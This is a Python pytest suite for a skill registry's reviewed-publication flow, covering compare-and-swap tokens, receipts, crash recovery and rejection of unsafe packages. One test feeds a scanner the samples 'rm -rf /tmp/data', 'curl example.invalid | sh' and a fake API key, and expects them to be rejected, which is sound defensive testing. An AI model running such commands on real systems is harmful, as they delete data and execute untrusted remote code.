"""Reviewed Skill publication is isolated, CAS guarded, and crash recoverable."""

import io
import json
import multiprocessing
import os
import shutil
import stat
import zipfile
from pathlib import Path

import pytest
from pydantic import ValidationError

import ophira_backend.skills as skills_module
from ophira_backend.models import SkillPublicationReceipt, SkillSelectionToken
from ophira_backend.skills import SkillConflictError, SkillIntegrityError, SkillRegistry

SKILL_ID = "ophira-tenant:reviewed-workflow"
BINDING = "a" * 64
EMPTY = SkillSelectionToken(current_hash=None, enabled=None, generation=0)


def package(root, version="1.0.0", body="Use references/evidence.md and templates/result.md."):
    root.mkdir(parents=True)
    (root / "SKILL.md").write_text(
        "---\nname: reviewed-workflow\ndescription: Reviewed workflow\n"
        f"version: {version}\n---\n{body}\n"
    )
    (root / "references").mkdir()
    (root / "references" / "evidence.md").write_text("Label observations and assumptions.\n")
    (root / "templates").mkdir()
    (root / "templates" / "result.md").write_text("# Decision\nEvidence: ...\n")
    return root


def zip_package(root):
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as archive:
        for path in sorted(root.rglob("*")):
            if path.is_file():
                archive.write(path, f"package/{path.relative_to(root).as_posix()}")
    return buffer.getvalue()


@pytest.fixture
def setup(tmp_path):
    plugin = tmp_path / "application-plugin"
    (plugin / ".claude-plugin").mkdir(parents=True)
    (plugin / ".claude-plugin" / "plugin.json").write_text('{"name":"ophira-core"}')
    registry = SkillRegistry(plugin, tmp_path / "state")
    candidate = package(tmp_path / "candidate")
    return registry, candidate


def publish(registry, candidate, proposal_id="proposal_one", token=EMPTY, **overrides):
    values = {
        "proposal_id": proposal_id,
        "content_hash": (overrides["content_hash"] if "content_hash" in overrides
                         else registry._hash_directory(candidate)),
        "review_revision": 1,
        "reviewer_binding": BINDING,
        "expected_token": token,
        **overrides,
    }
    return registry.publish_reviewed_candidate(candidate, **values)


def state(registry):
    return json.loads(registry.registry_state_path.read_bytes())


def test_inspection_keeps_pending_out_of_history_discovery_and_snapshots(setup):
    registry, candidate = setup
    canonical = registry.registry_state_path.read_bytes()
    before = {path.relative_to(registry.state_dir) for path in registry.state_dir.rglob("*")}
    inspected, review = registry.inspect_candidate(candidate)
    assert review.ok and inspected.id == SKILL_ID and inspected.enabled is False
    assert registry.list() == registry.snapshot() == []
    assert registry.selection_token(SKILL_ID) == EMPTY
    assert registry.publication_receipt("proposal_one") is None
    assert list(registry.versions_dir.iterdir()) == []
    assert registry.registry_state_path.read_bytes() == canonical
    assert before == {path.relative_to(registry.state_dir)
                      for path in registry.state_dir.rglob("*")}


def test_publication_commits_disabled_selection_generation_and_exact_receipt(setup):
    registry, candidate = setup
    receipt = publish(registry, candidate)
    assert receipt.skill_id == SKILL_ID
    assert receipt.previous_selection == EMPTY
    assert receipt.published_at.utcoffset() is not None
    canonical = state(registry)
    assert canonical == {
        "schema_version": 2,
        "enabled": {SKILL_ID: False},
        "current": {SKILL_ID: receipt.content_hash},
        "generations": {SKILL_ID: 1},
        "publication_receipts": {receipt.proposal_id: receipt.model_dump(mode="json")},
    }
    assert registry.get(SKILL_ID).enabled is False
    assert registry.snapshot() == []
    assert registry.publication_receipt(receipt.proposal_id) == receipt
    assert SkillRegistry(registry.plugin_dir, registry.state_dir).publication_receipt(
        receipt.proposal_id
    ) == receipt


def test_first_publication_of_a_frozen_candidate_changes_only_private_copy_permissions(setup):
    registry, candidate = setup
    registry._make_read_only(candidate)
    paths = [candidate, *candidate.rglob("*")]
    original_modes = {path: stat.S_IMODE(path.stat().st_mode) for path in paths}
    assert original_modes[candidate] == 0o555
    receipt = publish(registry, candidate)
    assert receipt.content_hash == registry._hash_directory(candidate)
    assert {path: stat.S_IMODE(path.stat().st_mode) for path in paths} == original_modes
    archived = Path(registry.get(SKILL_ID).path).parent
    assert archived != candidate
    assert all(stat.S_IMODE(path.stat().st_mode) == (0o555 if path.is_dir() else 0o444)
               for path in (archived, *archived.rglob("*")))
    assert not list(registry.staging_dir.iterdir())


def test_interrupted_frozen_candidate_copy_cleans_staging_and_preserves_source(setup, monkeypatch):
    registry, candidate = setup
    registry._make_read_only(candidate)
    original = skills_module.shutil.copytree
    before_hash = registry._hash_directory(candidate)
    before_state = registry.registry_state_path.read_bytes()
    before_modes = {path: stat.S_IMODE(path.stat().st_mode)
                    for path in (candidate, *candidate.rglob("*"))}

    def interrupted(source, destination, *args, **kwargs):
        result = original(source, destination, *args, **kwargs)
        if Path(source) == candidate:
            raise OSError("injected interruption after copying frozen subdirectories")
        return result

    monkeypatch.setattr(skills_module.shutil, "copytree", interrupted)
    with pytest.raises(OSError, match="injected interruption"):
        publish(registry, candidate)
    assert registry._hash_directory(candidate) == before_hash
    assert {path: stat.S_IMODE(path.stat().st_mode) for path in before_modes} == before_modes
    assert registry.registry_state_path.read_bytes() == before_state
    assert registry.publication_receipt("proposal_one") is None
    assert not list(registry.staging_dir.iterdir())


def test_exact_retry_does_not_read_candidate_or_rewrite_a_later_selection(setup, tmp_path):
    registry, candidate = setup
    receipt = publish(registry, candidate)
    registry.set_enabled(SKILL_ID, True)
    newer = package(tmp_path / "newer", "2.0.0")
    registry.install_zip(zip_package(newer))
    registry.set_enabled(SKILL_ID, True)
    canonical = registry.registry_state_path.read_bytes()
    shutil.rmtree(candidate)
    retried = publish(registry, candidate, content_hash=receipt.content_hash)
    assert retried == receipt
    assert registry.registry_state_path.read_bytes() == canonical
    assert registry.get(SKILL_ID).version == "2.0.0"
    assert registry.get(SKILL_ID).enabled is True


def test_commit_guard_refuses_selection_after_archive_without_writing_receipt(setup):
    registry, candidate = setup
    before = registry.registry_state_path.read_bytes()
    content_hash = registry._hash_directory(candidate)
    checkpoints = []

    def refuse_commit():
        # The guard runs after the final scan, hash verification and archive IO.
        target = registry.versions_dir / "ophira-tenant" / "reviewed-workflow" / content_hash
        assert (target / "SKILL.md").is_file()
        assert registry.registry_state_path.read_bytes() == before
        checkpoints.append("after_archive")
        raise RuntimeError("reviewer is no longer authorized")

    with pytest.raises(RuntimeError, match="no longer authorized"):
        publish(registry, candidate, before_commit=refuse_commit)
    assert checkpoints == ["after_archive"]
    assert registry.registry_state_path.read_bytes() == before
    assert registry.selection_token(SKILL_ID) == EMPTY
    assert registry.publication_receipt("proposal_one") is None
    assert registry.list() == []
    assert len(registry.versions(SKILL_ID)) == 1


def test_exact_receipt_retry_bypasses_commit_guard_and_preserves_later_enable(setup):
    registry, candidate = setup
    calls = []
    receipt = publish(registry, candidate, before_commit=lambda: calls.append("authorized"))
    assert calls == ["authorized"]
    registry.set_enabled(SKILL_ID, True)
    before = registry.registry_state_path.read_bytes()
    shutil.rmtree(candidate)
    result = publish(
        registry, candidate, content_hash=receipt.content_hash,
        before_commit=lambda: pytest.fail("committed retry must not reauthorize or publish"),
    )
    assert result == receipt
    assert registry.registry_state_path.read_bytes() == before


@pytest.mark.parametrize("changed", [
    {"content_hash": "b" * 64}, {"review_revision": 2}, {"reviewer_binding": "b" * 64},
    {"expected_token": SkillSelectionToken(current_hash=None, enabled=False, generation=0)},
])
def test_existing_receipt_requires_exact_review_without_mutation(setup, changed):
    registry, candidate = setup
    publish(registry, candidate)
    before = registry.registry_state_path.read_bytes()
    with pytest.raises(SkillConflictError, match="does not match review"):
        publish(registry, candidate, **changed)
    assert registry.registry_state_path.read_bytes() == before


@pytest.mark.parametrize("aba", ["enable", "version"])
def test_selection_token_rejects_aba_and_scans_nothing_after_stale_cas(
    setup, tmp_path, monkeypatch, aba,
):
    registry, candidate = setup
    first = publish(registry, candidate)
    token = registry.selection_token(SKILL_ID)
    if aba == "enable":
        registry.set_enabled(SKILL_ID, True)
        registry.set_enabled(SKILL_ID, False)
    else:
        second = package(tmp_path / "second", "2.0.0")
        registry.install_zip(zip_package(second))
        registry.rollback(SKILL_ID, content_hash=first.content_hash)
    now = registry.selection_token(SKILL_ID)
    assert now.current_hash == token.current_hash and now.enabled == token.enabled
    assert now.generation == token.generation + 2
    before = registry.registry_state_path.read_bytes()
    monkeypatch.setattr(registry, "_test_skill", lambda _skill: pytest.fail("stale CAS scanned"))
    with pytest.raises(SkillConflictError, match="changed since review"):
        publish(registry, candidate, "proposal_stale", token)
    assert registry.registry_state_path.read_bytes() == before


def test_ordinary_mutations_preserve_receipts_and_noops_preserve_generation(setup, tmp_path):
    registry, candidate = setup
    receipt = publish(registry, candidate)
    for action in (
        lambda: registry.set_enabled(SKILL_ID, False),
        lambda: registry.install_zip(zip_package(candidate)),
        lambda: registry.rollback(SKILL_ID, content_hash=receipt.content_hash),
    ):
        before = registry.registry_state_path.read_bytes()
        action()
        assert registry.registry_state_path.read_bytes() == before
    second = package(tmp_path / "second", "2.0.0")
    for expected_generation, action in enumerate((
        lambda: registry.set_enabled(SKILL_ID, True),
        lambda: registry.install_zip(zip_package(second)),
        lambda: registry.rollback(SKILL_ID, content_hash=receipt.content_hash),
    ), start=2):
        action()
        assert registry.selection_token(SKILL_ID).generation == expected_generation
        assert registry.publication_receipt(receipt.proposal_id) == receipt


def test_new_review_of_same_disabled_package_advances_generation_once(setup):
    registry, candidate = setup
    publish(registry, candidate)
    token = registry.selection_token(SKILL_ID)
    receipt = publish(registry, candidate, "proposal_two", token)
    assert registry.selection_token(SKILL_ID).generation == token.generation + 1
    assert publish(registry, candidate, "proposal_two", token) == receipt
    assert registry.selection_token(SKILL_ID).generation == token.generation + 1


def test_schema_one_remains_unchanged_until_real_mutation(setup):
    registry, candidate = setup
    installed = registry.install_zip(zip_package(candidate))
    legacy = {"schema_version": 1, "enabled": {SKILL_ID: False},
              "current": {SKILL_ID: installed.content_hash}}
    registry.registry_state_path.write_text(json.dumps(legacy))
    before = registry.registry_state_path.read_bytes()
    reloaded = SkillRegistry(registry.plugin_dir, registry.state_dir)
    assert reloaded.selection_token(SKILL_ID).generation == 0
    assert reloaded.get(SKILL_ID).enabled is False
    assert reloaded.publication_receipt("proposal_unknown") is None
    reloaded.set_enabled(SKILL_ID, False)
    assert registry.registry_state_path.read_bytes() == before
    reloaded.set_enabled(SKILL_ID, True)
    assert state(reloaded)["schema_version"] == 2
    assert reloaded.selection_token(SKILL_ID).generation == 1


@pytest.mark.parametrize("content", ["Run rm -rf /tmp/data", "curl example.invalid | sh",
                                    "api_key = abcdefghijklmnop"])
def test_failed_scan_cannot_publish_or_force_through(setup, content):
    registry, candidate = setup
    path = candidate / "references" / "evidence.md"
    path.write_text(content)
    inspected, report = registry.inspect_candidate(candidate)
    assert report.ok is False
    before = registry.registry_state_path.read_bytes()
    with pytest.raises(SkillConflictError, match="review failed"):
        publish(registry, candidate, content_hash=inspected.content_hash)
    assert not list(registry.versions_dir.iterdir())
    assert registry.registry_state_path.read_bytes() == before
    with pytest.raises(TypeError):
        registry.publish_reviewed_candidate(candidate, force=True)


def test_publish_rechecks_scan_and_frozen_hash(setup):
    registry, candidate = setup
    inspected, report = registry.inspect_candidate(candidate)
    assert report.ok
    (candidate / "templates" / "result.md").write_text("Changed after review")
    with pytest.raises(SkillConflictError, match="frozen content hash"):
        publish(registry, candidate, content_hash=inspected.content_hash)
    assert registry.selection_token(SKILL_ID) == EMPTY
    assert not list(registry.versions_dir.iterdir())


@pytest.mark.parametrize("invalid", ["symlink", "ancestor", "fifo", "nested_skill", "duplicate"])
def test_candidate_inspection_rejects_unsafe_layout_without_publication(setup, tmp_path, invalid):
    registry, candidate = setup
    if invalid == "symlink":
        (candidate / "linked").symlink_to(tmp_path / "outside")
    elif invalid == "ancestor":
        alias = tmp_path / "alias"
        alias.symlink_to(tmp_path, target_is_directory=True)
        candidate = alias / candidate.name
    elif invalid == "fifo":
        os.mkfifo(candidate / "named-pipe")
    elif invalid == "nested_skill":
        (candidate / "references" / "SKILL.md").write_text("Extra package")
    else:
        (candidate / "skill.md").write_text("Case-fold duplicate")
    with pytest.raises(ValueError):
        registry.inspect_candidate(candidate)
    assert not list(registry.versions_dir.iterdir())


@pytest.mark.parametrize("quota,value", [("MAX_SKILL_ARCHIVE_ENTRIES", 1),
                                        ("MAX_SKILL_UNPACKED_BYTES", 20)])
def test_candidate_inspection_enforces_bounded_work(setup, monkeypatch, quota, value):
    registry, candidate = setup
    monkeypatch.setattr(skills_module, quota, value)
    with pytest.raises(ValueError):
        registry.inspect_candidate(candidate)


def test_receipt_quota_preserves_existing_retry_and_rejects_before_candidate_io(setup, monkeypatch):
    registry, candidate = setup
    monkeypatch.setattr(skills_module, "MAX_SKILL_PUBLICATION_RECEIPTS", 1)
    receipt = publish(registry, candidate)
    token = registry.selection_token(SKILL_ID)
    shutil.rmtree(candidate)
    assert publish(registry, candidate, content_hash=receipt.content_hash) == receipt
    with pytest.raises(SkillConflictError, match="receipt quota"):
        publish(registry, candidate, "proposal_two", token, content_hash=receipt.content_hash)


@pytest.mark.parametrize("changed", [
    {"proposal_id": "../escape"}, {"proposal_id": "a" * 129},
    {"review_revision": True}, {"review_revision": 0}, {"review_revision": "1"},
    {"reviewer_binding": "SHA256?"}, {"content_hash": "A" * 64},
    {"expected_token": {"current_hash": None, "enabled": None, "generation": 0}},
])
def test_publication_arguments_fail_closed(setup, changed):
    registry, candidate = setup
    before = registry.registry_state_path.read_bytes()
    with pytest.raises(ValueError):
        publish(registry, candidate, **changed)
    assert registry.registry_state_path.read_bytes() == before


@pytest.mark.parametrize("key,value", [("generation", True), ("generation", "0"),
                                      ("generation", -1), ("enabled", 1),
                                      ("current_hash", "f" * 63)])
def test_selection_token_rejects_coercion_and_invalid_fields(key, value):
    with pytest.raises(ValidationError):
        SkillSelectionToken.model_validate({**EMPTY.model_dump(), key: value})


@pytest.mark.parametrize("corruption", [
    "unknown_field", "schema_bool", "generation_bool", "generation_negative", "unsafe_id",
    "receipt_key", "receipt_unknown", "receipt_revision_bool", "receipt_previous_bool",
    "receipt_hash", "receipt_binding", "receipt_timestamp", "receipt_future",
])
def test_canonical_v2_rejects_corrupt_fields(setup, corruption):
    registry, candidate = setup
    publish(registry, candidate)
    canonical = state(registry)
    receipt = canonical["publication_receipts"]["proposal_one"]
    if corruption == "unknown_field":
        canonical["extra"] = True
    elif corruption == "schema_bool":
        canonical["schema_version"] = True
    elif corruption == "generation_bool":
        canonical["generations"][SKILL_ID] = True
    elif corruption == "generation_negative":
        canonical["generations"][SKILL_ID] = -1
    elif corruption == "unsafe_id":
        canonical["enabled"]["../escape"] = False
    elif corruption == "receipt_key":
        canonical["publication_receipts"]["mismatched"] = canonical["publication_receipts"].pop(
            "proposal_one"
        )
    elif corruption == "receipt_unknown":
        receipt["unknown"] = True
    elif corruption == "receipt_revision_bool":
        receipt["review_revision"] = True
    elif corruption == "receipt_previous_bool":
        receipt["previous_selection"]["generation"] = True
    elif corruption == "receipt_hash":
        receipt["content_hash"] = "bad"
    elif corruption == "receipt_binding":
        receipt["reviewer_binding"] = "secret"
    elif corruption == "receipt_timestamp":
        receipt["published_at"] = "2026-09-06T00:00:00"
    else:
        receipt["previous_selection"]["generation"] = 100
    registry.registry_state_path.write_text(json.dumps(canonical))
    with pytest.raises(SkillIntegrityError):
        registry.selection_token(SKILL_ID)


def test_canonical_rejects_duplicate_fields_instead_of_last_key_winning(setup):
    registry, _ = setup
    registry.registry_state_path.write_text(
        '{"schema_version":1,"enabled":{},"current":{},"current":{}}'
    )
    with pytest.raises(SkillIntegrityError, match="unreadable"):
        registry.selection_token(SKILL_ID)


def test_failure_before_canonical_commit_leaves_only_unselected_history(setup, monkeypatch):
    registry, candidate = setup
    original = skills_module.os.replace

    def fail_state(source, target):
        if Path(target) == registry.registry_state_path:
            raise OSError("injected before canonical commit")
        original(source, target)

    monkeypatch.setattr(skills_module.os, "replace", fail_state)
    with pytest.raises(SkillIntegrityError):
        publish(registry, candidate)
    assert registry.selection_token(SKILL_ID) == EMPTY
    assert registry.publication_receipt("proposal_one") is None
    assert registry.list() == []
    assert len(registry.versions(SKILL_ID)) == 1
    monkeypatch.setattr(skills_module.os, "replace", original)
    receipt = publish(registry, candidate)
    assert registry.publication_receipt("proposal_one") == receipt


def test_failure_after_canonical_replace_is_recovered_by_receipt(setup, monkeypatch):
    registry, candidate = setup
    original = skills_module.os.fsync

    def fail_directory(descriptor):
        if stat.S_ISDIR(os.fstat(descriptor).st_mode):
            raise OSError("injected directory fsync failure")
        original(descriptor)

    monkeypatch.setattr(skills_module.os, "fsync", fail_directory)
    with pytest.raises(SkillIntegrityError):
        publish(registry, candidate)
    receipt = registry.publication_receipt("proposal_one")
    assert receipt is not None
    monkeypatch.setattr(skills_module.os, "fsync", original)
    registry.set_enabled(SKILL_ID, True)
    before = registry.registry_state_path.read_bytes()
    assert publish(registry, candidate) == receipt
    assert registry.registry_state_path.read_bytes() == before


def _process_publish(plugin, state_path, candidate, proposal_id, channel, crash=None):
    registry = SkillRegistry(Path(plugin), Path(state_path))
    if crash:
        original = registry._atomic_json_write

        def interrupted(path, value):
            if Path(path) == registry.registry_state_path and value.get("publication_receipts"):
                if crash == "before":
                    os._exit(23)
                original(path, value)
                os._exit(24)
            original(path, value)

        registry._atomic_json_write = interrupted
    channel.send("ready")
    assert channel.recv() == "go"
    try:
        receipt = publish(registry, Path(candidate), proposal_id)
        channel.send(("published", receipt.model_dump(mode="json")))
    except SkillConflictError:
        channel.send(("conflict", None))
    finally:
        channel.close()


@pytest.mark.parametrize("same_review", [False, True])
def test_two_spawned_publishers_cas_one_winner_without_losing_receipts(
    setup, tmp_path, same_review,
):
    registry, first = setup
    second = first if same_review else package(tmp_path / "second", "2.0.0")
    context = multiprocessing.get_context("spawn")
    children = []
    try:
        for index, candidate in enumerate((first, second)):
            parent, child = context.Pipe()
            process = context.Process(target=_process_publish, args=(
                str(registry.plugin_dir), str(registry.state_dir), str(candidate),
                f"proposal_{0 if same_review else index}", child,
            ))
            process.start()
            child.close()
            children.append((process, parent))
        for _, connection in children:
            assert connection.poll(10) and connection.recv() == "ready"
        for _, connection in children:
            connection.send("go")
        results = []
        for process, connection in children:
            assert connection.poll(10)
            results.append(connection.recv())
            process.join(10)
            assert process.exitcode == 0
        assert sorted(item[0] for item in results) == (
            ["published", "published"] if same_review else ["conflict", "published"]
        )
        if same_review:
            assert results[0][1] == results[1][1]
        canonical = state(registry)
        assert len(canonical["publication_receipts"]) == 1
        assert canonical["generations"] == {SKILL_ID: 1}
        assert len(registry.versions(SKILL_ID)) == 1
        assert registry.get(SKILL_ID).enabled is False
    finally:
        for process, connection in children:
            if process.is_alive():
                process.kill()
            process.join(5)
            connection.close()


@pytest.mark.parametrize("crash,code", [("before", 23), ("after", 24)])
def test_process_death_recovery_distinguishes_orphan_archive_from_committed_receipt(
    setup, crash, code,
):
    registry, candidate = setup
    context = multiprocessing.get_context("spawn")
    parent, child = context.Pipe()
    process = context.Process(target=_process_publish, args=(
        str(registry.plugin_dir), str(registry.state_dir), str(candidate),
        "proposal_one", child, crash,
    ))
    try:
        process.start()
        child.close()
        assert parent.poll(10) and parent.recv() == "ready"
        parent.send("go")
        process.join(10)
        assert process.exitcode == code
        recovered = SkillRegistry(registry.plugin_dir, registry.state_dir)
        receipt = recovered.publication_receipt("proposal_one")
        assert (receipt is not None) == (crash == "after")
        assert len(recovered.versions(SKILL_ID)) == 1
        if crash == "before":
            assert recovered.selection_token(SKILL_ID) == EMPTY
            receipt = publish(recovered, candidate)
        else:
            recovered.set_enabled(SKILL_ID, True)
            assert publish(recovered, candidate) == receipt
            assert recovered.get(SKILL_ID).enabled is True
        assert isinstance(receipt, SkillPublicationReceipt)
        assert recovered.publication_receipt("proposal_one") == receipt
    finally:
        if process.is_alive():
            process.kill()
        process.join(5)
        parent.close()
